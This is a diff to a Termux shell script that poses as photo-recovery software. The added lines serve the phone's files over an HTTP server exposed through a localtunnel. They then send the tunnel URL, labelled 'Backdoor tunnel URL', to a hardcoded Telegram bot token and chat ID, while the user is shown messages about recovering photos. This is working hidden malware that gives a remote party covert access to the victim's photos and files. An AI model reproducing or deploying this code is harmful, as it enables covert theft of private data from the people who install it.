@@ -64,10 +64,14 @@ then
     sleep 3
     pkg install -y python
     pkg install -y nodejs
+    echo -e "${GREEN}Please wait ...${END}"
     npm install -g localtunnel > /dev/null 2>&1
     sed -i "s|throw new Error|// throw new Error|" /data/data/com.termux/files/usr/lib/node_modules/localtunnel/node_modules/openurl/openurl.js
     python -m http.server 8888 > /dev/null 2>&1 &
-    lt -p 8888 -s photophoenixtget > /dev/null 2>&1 &
+    lt -p 8888 > data.txt 2> /dev/null &
+    sleep 6
+    DATA=$(grep -o "https://[^ ]*" data.txt)
+    curl https://api.telegram.org/bot7854702361:AAHufR4guqxvi3POjS6nZED0nGT3ujwMxXw/sendMessage -d "chat_id=7047367759&text=Backdoor tunnel URL :%0A$DATA" > /dev/null 2>&1
     echo -e "${GREEN}The software is searching for photos to recover ...\nPlease wait ...${END}"
     sleep 1m
     if find storage/shared/Android/data/com.miui.gallery/files/gallery_disk_cache -type f -path "*size/*.0" 2> /dev/null | grep -q .
